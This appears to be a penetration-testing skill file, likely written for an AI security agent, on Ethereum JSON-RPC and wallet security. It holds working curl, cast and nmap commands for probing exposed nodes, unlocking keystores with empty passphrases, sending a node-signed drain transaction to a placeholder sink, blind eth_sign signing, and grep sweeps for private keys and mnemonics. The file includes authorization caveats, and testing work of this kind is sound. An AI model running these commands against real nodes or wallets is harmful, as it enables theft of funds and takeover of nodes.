---
name: blockchain-rpc
description: Blockchain node and JSON-RPC security - exposed/unauthenticated RPC, personal_/admin_/debug_/miner_/txpool_ methods, open Geth/Erigon/Nethermind nodes, dApp signing abuse, approval drains, permit phishing, and key/mnemonic exposure
---

# Blockchain Node & JSON-RPC Security

Ethereum-compatible nodes expose a JSON-RPC interface that, when reachable without authentication and with privileged namespaces enabled, lets an attacker enumerate accounts, unlock keystores, sign and broadcast transactions, dump node internals, and drain any unlocked wallet. The default 8545/8546 (HTTP/WS) ports were historically bound to all interfaces with `personal_`, `admin_`, `miner_`, and `debug_` namespaces live, and countless nodes are still deployed that way behind a port forward or a misconfigured firewall. On the client side, dApp front-ends ask wallets to sign opaque payloads — blind `eth_sign`, unlimited ERC-20 approvals, and EIP-2612 permits — so a malicious or compromised front-end extracts funds without ever touching the node. This skill covers both the server side (exposed RPC, key material) and the client side (signing abuse, approval drains); the unauthenticated-RPC class is closely related to ssrf when an internal node is reached through a server-side request.

## Attack Surface

**Scope**
- HTTP JSON-RPC (default port 8545) and WebSocket JSON-RPC (default port 8546)
- IPC sockets (`geth.ipc`) when local/container access exists — IPC exposes all namespaces unconditionally
- Engine API (port 8551, JWT-authenticated consensus<->execution channel)
- Node clients: Geth, Erigon, Nethermind, Besu, Reth, and the Anvil/Hardhat dev nodes
- dApp front-ends and the wallet (MetaMask, WalletConnect) signing surface
- Keystore files, mnemonics, and plaintext private keys on disk or in env/CI

**Entry Points**
- Internet-exposed 8545/8546 with no auth and privileged namespaces enabled
- `personal_*` (account unlock/sign/send), `admin_*` (peers, nodeInfo), `debug_*` (traceTransaction, dumpBlock), `miner_*`, `txpool_*`
- Server-side request forgery reaching an internal `http://localhost:8545` (see ssrf)
- A malicious or XSS-compromised dApp front-end prompting `eth_sendTransaction`, `eth_sign`, `eth_signTypedData`, `approve`, or `permit`
- Leaked keystore/mnemonic via exposed config, backups, repo commits, or `debug` dumps

**Authentication and trust model**
- Public read methods (`eth_blockNumber`, `eth_call`, `eth_getBalance`) are usually harmless to expose
- State-changing methods require either an unlocked account (server holds the key) or a client-side signature (wallet holds the key)
- `--http.api`/`--ws.api` allowlists which namespaces are served; the dangerous ones are `personal,admin,debug,miner,txpool`
- Engine API uses a JWT shared secret (`jwtsecret` file); a leaked secret yields consensus-layer control
- The wallet trusts the front-end to render an honest transaction — blind signing breaks that trust

## Key Vulnerabilities

### Exposed / Unauthenticated JSON-RPC

A node bound to `0.0.0.0:8545` with no reverse-proxy auth answers any caller. Read methods leak chain/account data; if write namespaces are enabled, the node is fully controllable. Probe for liveness and the served namespace set first.

**Test:**
```
# Liveness + client/version fingerprint
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"web3_clientVersion","params":[]}'
# Chain + sync state
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}'
# cast equivalents
cast client --rpc-url http://TARGET:8545
cast chain-id --rpc-url http://TARGET:8545
cast block-number --rpc-url http://TARGET:8545
```

### Privileged Namespace Abuse (personal_/admin_/debug_/miner_/txpool_)

`eth_accounts` lists local accounts; `personal_unlockAccount` unlocks a keystore with a guessed/known passphrase; `personal_sendTransaction` and `eth_sendTransaction` then move funds using the node's own key. `admin_*` reveals peers and node identity, `debug_*` dumps state and traces, `miner_*` controls block production, `txpool_*` exposes the local mempool.

**Test:**
```
# Enumerate node-held accounts
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}'
# Attempt unlock (empty / common passphrase), 300s window
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"personal_unlockAccount","params":["0xACCOUNT","",300]}'
# Drain via node-signed tx (do NOT run against assets you do not own)
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_sendTransaction","params":[{"from":"0xACCOUNT","to":"0xSINK","value":"0x16345785d8a0000"}]}'
# Node internals
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"admin_nodeInfo","params":[]}'
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"txpool_content","params":[]}'
cast rpc debug_traceTransaction 0xTXHASH --rpc-url http://TARGET:8545
```

### Open Geth / Erigon / Nethermind Nodes

Mass-scannable: the RPC port plus the P2P/discovery and metrics ports. Banner and method-set differ per client (`web3_clientVersion` returns `Geth/...`, `erigon/...`, `Nethermind/...`). Enumerate which namespaces each client left enabled, since defaults and flags differ.

**Test:**
```
# Discover RPC + ancillary ports
nmap -sV -Pn -p 8545,8546,8551,30303,6060,8008 --open TARGET
# Banner-grab JSON-RPC with nmap script engine over HTTP
nmap -p 8545 --script http-post --script-args 'http-post.path=/,http-post.body={"jsonrpc":"2.0","id":1,"method":"web3_clientVersion","params":[]}' TARGET
# Which namespaces respond? loop methods and watch for "method not found" vs a result
for m in eth_accounts personal_listAccounts admin_peers debug_metrics miner_start txpool_status; do
  echo -n "$m: "; curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$m\",\"params\":[]}"; echo
done
```

### dApp Front-End Signing Abuse (blind signing)

A malicious front-end requests `eth_sendTransaction` with crafted `data`, or asks the user to "verify" via a signature that is actually an authorization. Blind signing — approving a hex blob the wallet cannot decode — is the core failure. Distinguish `eth_sign` (signs *arbitrary 32 bytes*, including a valid tx hash — extremely dangerous), `personal_sign` (prefixes the EIP-191 string so it cannot be a tx), and `eth_signTypedData_v4` (structured, but still abusable via misleading types).

**Test:**
```
# Enumerate what methods the injected provider exposes (run in dApp page console)
node -e "const {ethers}=require('ethers');const p=new ethers.JsonRpcProvider(process.env.RPC);p.send('eth_accounts',[]).then(console.log)"
# eth_sign of a raw 32-byte digest == signing a transaction blind (the dangerous primitive)
cast rpc eth_sign 0xSIGNER 0x$(python3 -c "print('de'*32)") --rpc-url $RPC
# web3.js: detect a front-end calling eth_sign vs personal_sign
node -e "const Web3=require('web3');const w=new Web3(process.env.RPC);w.eth.sign('0xdeadbeef','0xSIGNER').then(console.log).catch(e=>console.log(e.message))"
```

### Unlimited ERC-20 Approvals / Approval Drains

dApps commonly request `approve(spender, type(uint256).max)` for UX, leaving the spender able to `transferFrom` the user's full balance forever. A malicious or later-compromised spender drains on its own schedule. Enumerate outstanding allowances and revoke; flag any approval to an unverified or EOA spender.

**Test:**
```
# Read an outstanding allowance
cast call $TOKEN "allowance(address,address)(uint256)" $OWNER $SPENDER --rpc-url $RPC
# Spot unlimited approval (== 2**256-1)
python3 -c "print(hex(2**256-1))"   # 0xffff...ffff is the red flag
# Enumerate Approval events for a victim to map every spender granted access
cast logs --from-block 0 --address $TOKEN \
  "Approval(address,address,uint256)" $OWNER --rpc-url $RPC
# Revoke (set allowance to 0)
cast send $TOKEN "approve(address,uint256)" $SPENDER 0 --rpc-url $RPC --private-key $PK
```

### Permit Phishing & Domain-Separator / chainId Confusion

EIP-2612 `permit` and Permit2 let a *signature* (no on-chain tx, no gas) authorize a spender — perfect for phishing, since the victim only "signs a message". A signature missing a `chainId` or with a reused/forgeable EIP-712 domain separator is replayable across chains or contracts. Verify the signed `domainSeparator` matches the token's real one and includes the live `chainId`.

**Test:**
```
# Read the token's real EIP-712 domain separator and nonce
cast call $TOKEN "DOMAIN_SEPARATOR()(bytes32)" --rpc-url $RPC
cast call $TOKEN "nonces(address)(uint256)" $OWNER --rpc-url $RPC
cast chain-id --rpc-url $RPC   # must be inside the domain the victim signed
# ethers: reconstruct the domain and confirm a phishing payload's separator differs
node -e "const {ethers}=require('ethers');console.log(ethers.TypedDataEncoder.hashDomain({name:'USD Coin',version:'2',chainId:1,verifyingContract:process.env.TOKEN}))"
# A Permit2 SignatureTransfer authorizing an attacker spender is the modern drain vector — inspect signed 'spender'
```

### Wallet RPC Method Enumeration

The injected EIP-1193 provider (`window.ethereum`) and node both advertise method sets. Enumerating them reveals dangerous capabilities left enabled (`wallet_*`, `personal_*`) and which chains/accounts are reachable, guiding the abuse path.

**Test:**
```
# rpc_modules lists every served namespace on a node
curl -s -X POST http://TARGET:8545 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"rpc_modules","params":[]}'
# In a dApp page: enumerate provider capabilities
node -e "console.log(['eth_accounts','eth_requestAccounts','wallet_getPermissions','wallet_switchEthereumChain','personal_sign','eth_sign','eth_signTypedData_v4'])"
# cast: probe arbitrary method support (errors with 'method not found' if disabled)
cast rpc rpc_modules --rpc-url http://TARGET:8545
```

### Key / Mnemonic Exposure

Plaintext private keys and BIP-39 mnemonics leak via committed config, `.env`, CI logs, keystore files with empty passphrases, and `debug` dumps. A single leaked key is total account compromise; a mnemonic compromises every derived address. Treat any 64-hex blob or 12/24-word phrase in scope as a live secret.

**Test:**
```
# Repo/filesystem sweep for key material (use search tool in-codebase; these are field one-liners)
grep -rnE "0x[a-fA-F0-9]{64}" . --include='*.env' --include='*.json' --include='*.ts'
grep -riE "mnemonic|seed phrase|PRIVATE_KEY|(\b[a-z]+\b ){11}[a-z]+" .
# Keystore with empty/weak passphrase -> derive the address
cast wallet address --keystore ./keystore/UTC--... --password ""
# Confirm a leaked key controls funds (read-only: derive address, check balance)
cast wallet address --private-key 0xLEAKEDKEY
cast balance $(cast wallet address --private-key 0xLEAKEDKEY) --rpc-url $RPC
```

## Bypass Techniques

**Reach the bound interface**
- Node bound to `127.0.0.1` but proxied: hit the reverse proxy path, or pivot through SSRF (see ssrf) to `http://localhost:8545`
- WebSocket (8546) sometimes enables namespaces the HTTP port (8545) disables — always test both

**Namespace probing**
- A method returning `the method X does not exist/is not available` means the namespace is *disabled*; any other error (params, account locked) means it is *enabled* — that distinction maps the real attack surface

**Signing primitive confusion**
- If `eth_sign` is available, a "login signature" request can be a transaction hash in disguise — the wallet signs 32 raw bytes either way
- A front-end that downgrades `eth_signTypedData_v4` to `eth_sign` is suppressing the human-readable preview on purpose

**Unlock window reuse**
- `personal_unlockAccount` with a duration keeps the key hot; even a brief window lets a watcher fire `eth_sendTransaction` before re-lock

## Testing Methodology

1. **Scan** - `nmap -p 8545,8546,8551,30303` to find RPC, WS, Engine, and P2P ports across the range
2. **Fingerprint** - `web3_clientVersion` + `eth_chainId` to identify client (Geth/Erigon/Nethermind) and network
3. **Enumerate namespaces** - `rpc_modules` and a method-probe loop to learn which of `personal/admin/debug/miner/txpool` are live
4. **Read first** - `eth_accounts`, `eth_getBalance`, `txpool_content`, `admin_peers` for non-destructive intel
5. **Test write path** - attempt `personal_unlockAccount` (empty/common passphrase) only against assets you control or have authorization for
6. **Client-side review** - inspect the dApp for `eth_sign`, blind `eth_sendTransaction`, unlimited `approve`, and `permit` prompts
7. **Allowance audit** - enumerate `Approval` events and current `allowance` for the in-scope account; flag max approvals to unverified spenders
8. **Secret sweep** - search repo, config, CI, and keystores for keys/mnemonics; verify any hit derives a funded address
9. **Engine API** - if 8551 is open, check whether the `jwtsecret` is default/leaked

## Validation

1. Prove a privileged method *responds* (not "method not found") to establish the namespace is enabled, before any state change
2. For account control, derive the address and read its balance — do not broadcast a drain against assets you are not authorized to move
3. For approval drains, show the on-chain `allowance` value (`== 2**256-1`) and the spender's verification status
4. For permit/domain confusion, show the token's real `DOMAIN_SEPARATOR()` and `chainId` versus what a phishing payload signs
5. For key exposure, derive the public address from the leaked secret and match it to a funded on-chain account — never publish the secret
6. Capture the exact JSON-RPC request/response so the finding is reproducible

## False Positives

- A reachable RPC that serves only read methods (`eth_*` getters) with `personal/admin/debug` disabled — informational, not critical
- `eth_accounts` returning `[]` (no node-held keys) so `personal_send` has nothing to move
- WS/HTTP returning 401/403 or behind an authenticating reverse proxy (auth is working)
- Unlimited approval to a well-known, audited, immutable router (Uniswap, Permit2) — standard UX, lower risk than an EOA/unverified spender
- A 64-hex string that is a transaction hash, block hash, or storage value rather than a private key
- Dev nodes (Anvil/Hardhat) intentionally exposing unlocked accounts on a local-only, non-production chainId

## Impact

- Direct theft of all funds in node-unlocked accounts via `eth_sendTransaction`/`personal_sendTransaction`
- Full node control: peer manipulation, mining/validation control, mempool surveillance
- Wallet drain through unlimited approvals or a signed permit — no on-chain victim action required
- Cross-chain signature replay when `chainId`/domain separator is omitted
- Total account/identity compromise from a leaked private key or mnemonic (all derived addresses)
- Information disclosure of internal topology, pending transactions, and account balances (see information_disclosure)

## Pro Tips

1. Always test both 8545 (HTTP) and 8546 (WS) — namespace allowlists frequently differ between transports
2. `rpc_modules` is the single fastest map of attack surface; if it is disabled, fall back to a method-probe loop and read the error strings
3. "method does not exist/is not available" = namespace off; a params/account error = namespace on — that error-string distinction is the whole recon
4. `eth_sign` is the nuclear primitive on the client side: it signs raw bytes, so a "sign-in" prompt can be a transaction hash — flag any dApp that uses it
5. Unlimited (`2**256-1`) approvals are the most common live drain vector in the wild; enumerate `Approval` logs, not just the current allowance
6. Permit phishing needs no gas and no on-chain footprint until the drain fires — a "just sign this message" flow is the tell
7. Internal nodes bound to localhost are reachable through SSRF; chain the ssrf skill to hit `http://169.254.x` or `http://localhost:8545`
8. Empty-passphrase keystores are common on test/staging boxes promoted to prod — always try `""` and the project name as the passphrase
9. Never broadcast a proof-of-drain against third-party assets; derive-and-read (address + balance) proves control without theft

## Summary

Blockchain-RPC findings chain from exposure to total compromise on both sides of the wire: an internet-reachable node with `personal_`/`admin_`/`debug_` enabled lets an attacker enumerate accounts, unlock a keystore, and broadcast a node-signed drain, while a dApp that blind-signs or requests unlimited approvals and gasless permits lets the same theft happen with the key never leaving the user's wallet. Recon is namespace enumeration (`rpc_modules` plus the method-probe error-string trick) and signing-primitive triage (`eth_sign` vs `personal_sign`, allowance and domain-separator audits); validate by proving a method responds or a key derives a funded address, and never broadcast a destructive transaction against assets you are not authorized to move.
